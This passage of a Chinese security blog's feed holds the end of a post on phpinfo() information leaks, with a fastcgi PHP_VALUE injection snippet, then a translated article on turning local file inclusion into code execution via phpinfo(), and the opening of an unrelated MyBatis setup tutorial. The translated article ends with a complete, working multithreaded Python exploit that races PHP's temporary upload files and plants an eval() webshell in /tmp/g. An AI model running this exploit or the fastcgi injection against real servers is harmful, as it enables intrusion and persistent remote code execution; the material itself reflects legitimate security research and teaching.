2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的 xml 文件时未对 xml 文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，会导致XXE。</p><h3 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a>memcache</h3><p><a href="http://blog.nsfocus.net/memcache-unauthorized-access-exploit/">Memcache未授权访问漏洞利用及修复</a></p><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><p><a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html">利用redis写webshell</a></p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>Session.upload_progress 是PHP5.4的新特征。<br>1.序列化处理器不一致导致对象注入。<br>详情：<a href="https://ab-alex.xyz/2019/05/14/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">session反序列化</a></p><p>2.session.upload_progress加本地文件包含&#x3D;getshell</p><p><a href="https://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress">Session-upload-progress</a><br><a href="https://ab-alex.xyz/2019/08/06/2018n1ctf-esay-php%E5%A4%8D%E7%8E%B0/">非预期解法一</a></p><h3 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h3><p>Xdebug命令执行<br><a href="https://paper.seebug.org/397/">Xdebug: A Tiny Attack Surface</a><br><a href="https://skysec.top/2018/04/04/amazing-phpinfo/#Xdebug">Xdebug</a><br><a href="https://paper.seebug.org/668/">Xdebug 攻击面在 PhpStorm 上的现实利用</a><br><a href="https://ab-alex.xyz/2019/08/06/2018n1ctf-esay-php%E5%A4%8D%E7%8E%B0/">非预期解法三</a></p><h3 id="GOPHER"><a href="#GOPHER" class="headerlink" title="GOPHER"></a>GOPHER</h3><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/">利用 Gopher 协议拓展攻击面</a><br>首先要支持gopher协议，然后找到一个能执行curl会话的参数，构造gopher格式的payload以post格式去执行反弹shell。</p><h3 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a>fastcgi</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#php-fpmfastcgi">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#php-fpmfastcgi</a></p><p>通过fastcgi传入环境变量，设置</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-symbol">&#x27;PHP_VALUE</span>&#x27;: <span class="hljs-symbol">&#x27;auto_prepend_file</span> =php:<span class="hljs-comment">//input&#x27;,</span><br><span class="hljs-symbol">&#x27;PHP_ADMIN_VALUE</span>&#x27;: <span class="hljs-symbol">&#x27;allow_url_include</span> = On&#x27;<br></code></pre></td></tr></table></figure><p>将执行的代码放在body中执行任意代码。</p><h2 id="OPCACHE"><a href="#OPCACHE" class="headerlink" title="OPCACHE"></a>OPCACHE</h2><p><a href="https://skysec.top/2018/04/04/amazing-phpinfo/#OPCACHE">OPCACHE</a></p><h2 id="域-用户"><a href="#域-用户" class="headerlink" title="域&amp;用户"></a>域&amp;用户</h2><p>Phpinfo页面还能看到当前域，当前登录用户</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://skysec.top/2018/04/04/amazing-phpinfo/#phpinfo-LFI">amazing phpinfo()</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息泄露</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【翻译】通过phpinfo()实现LFI2RCE</title>
    <link href="/2022/05/14/%E3%80%90%E7%BF%BB%E8%AF%91%E3%80%91%E9%80%9A%E8%BF%87phpinfo()%E5%AE%9E%E7%8E%B0%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/05/14/%E3%80%90%E7%BF%BB%E8%AF%91%E3%80%91%E9%80%9A%E8%BF%87phpinfo()%E5%AE%9E%E7%8E%B0%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote><p>原文《LFI WITH PHPINFO() ASSISTANCE》于2011年9月由Brett Moore完成。</p><p><a href="https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf">原文pdf下载</a></p></blockquote><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>目前在测试PHP应用程序中，非常习惯于去测试本地文件包含漏洞（LFI）。根据服务器的配置，LFI非常有可能通过以下技术转化为代码执行漏洞（RCE）：</p><ul><li>&#x2F;proc&#x2F;self&#x2F;environ</li><li>&#x2F;proc&#x2F;self&#x2F;fd&#x2F;…</li><li>&#x2F;var&#x2F;log&#x2F;…</li><li>&#x2F;var&#x2F;lib&#x2F;php&#x2F;session&#x2F; (PHP Sessions)</li><li>&#x2F;tmp&#x2F; (PHP Sessions)</li><li>php:&#x2F;&#x2F;input wrapper</li><li>php:&#x2F;&#x2F;filter wrapper</li><li>data: wrapper</li></ul><p>本文的研究是对Gynvael Coldwind的<a href="http://www.exploit-db.com/download_pdf/17010/">《PHP LFI to arbitratry code execution via rfc1867 file upload temporary files》</a>的扩展，在这篇文章里，GC表述了PHP文件上传的具体原理。特别是他提到了如果PHP配置文件中开启了<code>file_uploads = on</code>，那么PHP会接受一个文件上传的post请求到任意PHP文件。并且上传的文件会存储在&#x2F;tmp目录下，直到被请求的PHP页面全部加载完成。这个过程在PHP官方文档中也有提到：“如果文件还没有移动或重命名，那么会在请求的结束从临时目录中删除。”</p><p>在这篇文章中，GC利用这个行为，在windows系统上通过使用<code>FindFirstFile quirk</code>实施攻击。这个实验过程被记录在这篇文章中：</p><p><a href="http://onsec.ru/onsec.whitepaper-02.eng.pdf">《Oddities of PHP file access in Windows. Cheat-sheet, 2011 (Vladimir Vorontsov, Arthur Gerkis)》</a> </p><p>下面的文章虽然与LFI研究不相关，但对于PHP的web应用安全研究也是一份感兴趣的材料。这篇文章记录了一种行为，即PHP脚本在通过Head Http变量时的处理过程。</p><p><a href="https://students.mimuw.edu.pl/~ai292615/php_head_trick.pdf">《HTTP HEAD method trick in php scripts (Adam Iwaniuk)》</a> </p><p><code>FindFirstFile quirk</code>对运行在GNU&#x2F;linux上的PHP引擎不起作用，然而在特定条件下利用PHP文件上传的特性进行攻击的特性依然可行。这篇文章详细的描述了其中一种情况，当访问输出phpinfo()调用结果的脚本在目标服务器上可用时，该条件变得可用。</p><h1 id="LFI-with-phpinfo"><a href="#LFI-with-phpinfo" class="headerlink" title="LFI with phpinfo()"></a>LFI with phpinfo()</h1><p>实现这个攻击需要满足两个攻击条件：</p><ul><li>LFI漏洞</li></ul><p>​必须有一个本地文件包含漏洞用于包含通过phpinfo脚本上传的临时文件（用于写shell）</p><ul><li>phpinfo()页面</li></ul><p>​其实任何能够显示phpinfo()输出的页面都可以，当然最常见的就是phpinfo.php页面</p><h1 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo()"></a>phpinfo()</h1><p>phpinfo()函数能够输出很多PHP变量，包括任何通过<code>_GET</code>,<code>_POST</code>和<code>_FILES</code>上传的变量。下面的请求和输出截图表名phpinfo()显示了上传的临时文件名。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">POST /phpinfo.php HTTP/<span class="hljs-number">1.0</span><br>Content-<span class="hljs-keyword">Type</span>: multipart/form-data; boundary=<span class="hljs-comment">---------------------------</span><br><span class="hljs-number">7</span>db268605ae<br>Content-Length: <span class="hljs-number">196</span><br><span class="hljs-comment">-----------------------------7db268605ae</span><br>Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;dummyname&quot;; filename=&quot;test.txt&quot;<br>Content-<span class="hljs-keyword">Type</span>: <span class="hljs-type">text</span>/plain<br><span class="hljs-keyword">Security</span> Test<br><span class="hljs-comment">-----------------------------7db268605ae</span><br></code></pre></td></tr></table></figure><p><img src="/image-20220516171102460.png" alt="image-20220516171102460"></p><h1 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h1><p>上面说到，上传的临时文件只存在于php处理器在处理被请求的PHP文件，并且会在处理结束时删除这个临时文件。</p><p>我们可以用这个命令来监控临时文件夹，从而看到临时文件被创建的过程。<code>sudo inotifywat -m -r /tmp</code></p><p>假设这个处理过程很长，那么我们就可以看到php会在临时文件夹下创建这个临时文件，一点一点写入上传的内容。并且在这个过程中phpinfo页面上会显示要写入内容的临时文件名。我们可以就可以处理结束之前包含这个临时文件，从而执行里面的恶意php代码。</p><p>PHP会使用输出缓冲器来提高数据传输的效率，这个特性默认启用，并且缓冲区的大小为4096，可以参考<a href="http://php.net/manual/en/outcontrol.configuration.php#ini.output-buffering">php文档中关于这个特性的表述</a></p><p>当php脚本的输出大于缓冲器的大小，部分内容会通过<a href="http://en.wikipedia.org/wiki/Chunked_transfer_encoding">分块传输</a>返回给请求者。</p><p>为了确保php脚本的输出大于缓冲区的大小，并且轻微增加处理的时间，需要在http header位置加入额外的填充。</p><p>通过多次post上传到phpinfo脚本，并且小心地控制读取，就能够取到临时文件名，然后请求存在LFI漏洞的脚本来包含这个临时文件。这就需要并发来条件竞争，从而让LFI转换成RCE。</p><p>这个技术已经同时在本地网络环境和Internet上的远程目标中尝试通过。下面贴上exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python </span><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> socket<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">setup</span>(<span class="hljs-params">host, port</span>):<br>    TAG=<span class="hljs-string">&quot;Security Test&quot;</span><br>    PAYLOAD=<span class="hljs-string">&quot;&quot;&quot;%s\r</span><br><span class="hljs-string">&lt;?php file_put_contents(&#x27;/tmp/g&#x27;, &#x27;&lt;?=eval($_REQUEST[1])?&gt;&#x27;)?&gt;\r&quot;&quot;&quot;</span> % TAG<br>    REQ1_DATA=<span class="hljs-string">&quot;&quot;&quot;-----------------------------7dbff1ded0714\r</span><br><span class="hljs-string">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\r</span><br><span class="hljs-string">Content-Type: text/plain\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">%s</span><br><span class="hljs-string">-----------------------------7dbff1ded0714--\r&quot;&quot;&quot;</span> % PAYLOAD<br>    padding=<span class="hljs-string">&quot;A&quot;</span> * <span class="hljs-number">5000</span><br>    REQ1=<span class="hljs-string">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot; HTTP/1.1\r</span><br><span class="hljs-string">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_USER_AGENT: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">HTTP_PRAGMA: &quot;&quot;&quot;</span>+padding+<span class="hljs-string">&quot;&quot;&quot;\r</span><br><span class="hljs-string">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r</span><br><span class="hljs-string">Content-Length: %s\r</span><br><span class="hljs-string">Host: %s\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">%s&quot;&quot;&quot;</span> %(<span class="hljs-built_in">len</span>(REQ1_DATA),host,REQ1_DATA)<br>    <span class="hljs-comment">#modify this to suit the LFI script   </span><br>    LFIREQ=<span class="hljs-string">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\r</span><br><span class="hljs-string">User-Agent: Mozilla/4.0\r</span><br><span class="hljs-string">Proxy-Connection: Keep-Alive\r</span><br><span class="hljs-string">Host: %s\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">\r</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> (REQ1, TAG, LFIREQ)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">phpInfoLFI</span>(<span class="hljs-params">host, port, phpinforeq, offset, lfireq, tag</span>):<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    <br><br>    s.connect((host, port))<br>    s2.connect((host, port))<br><br>    s.send(phpinforeq)<br>    d = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(d) &lt; offset:<br>        d += s.recv(offset)<br>    <span class="hljs-keyword">try</span>:<br>        i = d.index(<span class="hljs-string">&quot;[tmp_name] =&amp;gt; &quot;</span>)<br>        fn = d[i+<span class="hljs-number">17</span>:i+<span class="hljs-number">31</span>]<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    s2.send(lfireq % (fn, host))<br>    d = s2.recv(<span class="hljs-number">4096</span>)<br>    s.close()<br>    s2.close()<br><br>    <span class="hljs-keyword">if</span> d.find(tag) != -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">return</span> fn<br><br>counter=<span class="hljs-number">0</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ThreadWorker</span>(threading.Thread):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, e, l, m, *args</span>):<br>        threading.Thread.__init__(self)<br>        self.event = e<br>        self.lock =  l<br>        self.maxattempts = m<br>        self.args = args<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">global</span> counter<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> self.event.is_set():<br>            <span class="hljs-keyword">with</span> self.lock:<br>                <span class="hljs-keyword">if</span> counter &gt;= self.maxattempts:<br>                    <span class="hljs-keyword">return</span><br>                counter+=<span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">try</span>:<br>                x = phpInfoLFI(*self.args)<br>                <span class="hljs-keyword">if</span> self.event.is_set():<br>                    <span class="hljs-keyword">break</span>                <br>                <span class="hljs-keyword">if</span> x:<br>                    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nGot it! Shell created in /tmp/g&quot;</span><br>                    self.event.<span class="hljs-built_in">set</span>()<br>                    <br>            <span class="hljs-keyword">except</span> socket.error:<br>                <span class="hljs-keyword">return</span><br>    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getOffset</span>(<span class="hljs-params">host, port, phpinforeq</span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span><br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((host,port))<br>    s.send(phpinforeq)<br>    <br>    d = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = s.recv(<span class="hljs-number">4096</span>)<br>        d+=i        <br>        <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;&quot;</span>:<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-comment"># detect the final chunk</span><br>        <span class="hljs-keyword">if</span> i.endswith(<span class="hljs-string">&quot;0\r\n\r\n&quot;</span>):<br>            <span class="hljs-keyword">break</span><br>    s.close()<br>    i = d.find(<span class="hljs-string">&quot;[tmp_name] =&amp;gt; &quot;</span>)<br>    <span class="hljs-keyword">if</span> i == -<span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&quot;No php tmp_name in phpinfo output&quot;</span>)<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;found %s at %i&quot;</span> % (d[i:i+<span class="hljs-number">10</span>],i)<br>    <span class="hljs-comment"># padded up a bit</span><br>    <span class="hljs-keyword">return</span> i+<span class="hljs-number">256</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;LFI With PHPInfo()&quot;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;-=&quot;</span> * <span class="hljs-number">30</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class="hljs-number">0</span>]<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        host = socket.gethostbyname(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">except</span> socket.error, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class="hljs-number">1</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    port=<span class="hljs-number">80</span><br>    <span class="hljs-keyword">try</span>:<br>        port = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])<br>    <span class="hljs-keyword">except</span> IndexError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> ValueError, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class="hljs-number">2</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    <br>    poolsz=<span class="hljs-number">10</span><br>    <span class="hljs-keyword">try</span>:<br>        poolsz = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">3</span>])<br>    <span class="hljs-keyword">except</span> IndexError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">except</span> ValueError, e:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class="hljs-number">3</span>], e)<br>        sys.exit(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Getting initial offset...&quot;</span>,  <br>    reqphp, tag, reqlfi = setup(host, port)<br>    offset = getOffset(host, port, reqphp)<br>    sys.stdout.flush()<br><br>    maxattempts = <span class="hljs-number">1000</span><br>    e = threading.Event()<br>    l = threading.Lock()<br><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz<br>    sys.stdout.flush()<br><br>    tp = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,poolsz):<br>        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))<br><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:<br>        t.start()<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> e.wait(<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">if</span> e.is_set():<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">with</span> l:<br>                sys.stdout.write( <span class="hljs-string">&quot;\r% 4d / % 4d&quot;</span> % (counter, maxattempts))<br>                sys.stdout.flush()<br>                <span class="hljs-keyword">if</span> counter &gt;= maxattempts:<br>                    <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span><br>        <span class="hljs-keyword">if</span> e.is_set():<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Woot!  \m/&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;:(&quot;</span><br>    <span class="hljs-keyword">except</span> KeyboardInterrupt:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;\nTelling threads to shutdown...&quot;</span><br>        e.<span class="hljs-built_in">set</span>()<br>    <br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&quot;Shuttin&#x27; down...&quot;</span><br>    <span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> tp:<br>        t.join()<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
      <tag>RCE</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MyBatis学习</title>
    <link href="/2022/04/30/MyBatis%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/04/30/MyBatis%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="配置JDK1-8"><a href="#配置JDK1-8" class="headerlink" title="配置JDK1.8"></a>配置JDK1.8</h2><p>运行环境: ubuntu x64</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">解压到/opt下<br>sudo tar -zxvf jdk-8u181-linux-x64.tar.gz -C /opt<br><br>配置全局环境变量<br>sudo vim /etc/profile<br><span class="hljs-built_in">export</span> JAVA_HOME=/opt/jdk1.8.0_331<br><span class="hljs-built_in">export</span> CLASSPATH=.:<span class="hljs-variable">$JAVA_HOME</span>/lib:<span class="hljs-variable">$JAVA_HOME</span>/jre/lib<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$JAVA_HOME</span>/bin:<span class="hljs-variable">$PATH</span><br><br>使环境变量生效<br><span class="hljs-built_in">source</span> /etc/profile<br><br>验证是否安装成功<br>java -version<br></code></pre></td></tr></table></figure><h2 id="JDBC"><a href="#JDBC" class="headerlink" title="JDBC"></a>JDBC</h2><p>是java用于数据库连接的标准API</p><p><strong>JDBC连接数据库示例代码如下:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">CLASS_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">URL</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/mysql&quot;</span><br><span class="hljs-type">String</span> <span class="hljs-variable">USERNAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br><span class="hljs-type">String</span> <span class="hljs-variable">PASSWORD</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;root&quot;</span>;<br><br>Class.forName(CLASS_NAME);<span class="hljs-comment">// 注册JDBC驱动类</span><br><span class="hljs-type">Connection</span> <span class="hljs-variable">connection</span> <span class="hljs-operator">=</span> DriverManager.getConnection(URL, USERNAME, PASSWORD);<br></code></pre></td></tr></table></figure><h2 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h2><p>项目架构管理工具，自动导入jar包</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs routeros">解压到/opt下<br>sudo tar -zxvf apache-maven-3.8.5-bin.tar.gz -C /opt<br><br>配置全局环境变量<br>sudo vim /etc<span class="hljs-built_in">/profile</span><br><span class="hljs-built_in"></span><span class="hljs-built_in">export</span> <span class="hljs-attribute">MAVEN_HOME</span>=/opt/apache-maven-3.8.5<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">M2_HOME</span>=<span class="hljs-variable">$MAVEN_HOME</span>/bin<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-variable">$MAVEN_HOME</span>/bin:$PATH<br><br>使环境变量生效<br>source /etc<span class="hljs-built_in">/profile</span><br><span class="hljs-built_in"></span><br>验证是否安装成功<br>mvn -v<br></code></pre></td></tr></table></figure><h3 id="配置阿里云镜像"><a href="#配置阿里云镜像" 